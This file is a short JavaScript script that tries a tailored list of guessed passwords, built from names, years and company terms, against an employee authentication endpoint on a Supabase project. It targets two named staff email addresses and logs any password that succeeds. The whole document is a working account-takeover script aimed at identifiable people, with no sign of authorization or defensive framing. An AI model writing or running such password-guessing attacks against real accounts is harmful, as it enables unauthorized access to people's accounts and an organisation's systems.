const url = 'https://popypyunzkuyighdyjkc.supabase.co';
const key = 'sb_publishable_g5wGBHtlFR1Y7AtUj94_DQ_MSSn_CH7';

const candidates = [
  'cristina2026', 'Cristina2026', 'cristina', '123456', '12345678', 'eNTRADA1%', 'entrada1%', 'Entrada1%',
  'BU-2026', 'brainup2026', 'Brainup2026', 'cordinadora2026', 'coordinadora2026', 'temporal123',
  'malgari2026', 'Malgari2026', 'malgari', 'Malgari'
];

async function checkCandidates(email) {
  for (const pass of candidates) {
    try {
      const res = await fetch(`${url}/rest/v1/rpc/authenticate_employee`, {
        method: 'POST',
        headers: { 'apikey': key, 'Authorization': `Bearer ${key}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ p_email: email, p_password: pass })
      });
      const data = await res.json();
      if (data.success) {
        console.log(`FOUND FOR ${email}: '${pass}'`);
        return;
      }
    } catch(e) {}
  }
  console.log(`NOT FOUND for ${email}`);
}

async function run() {
  await checkCandidates('cristina@brainupgrup.com');
  await checkCandidates('malgari@brainupgrup.com');
}

run();

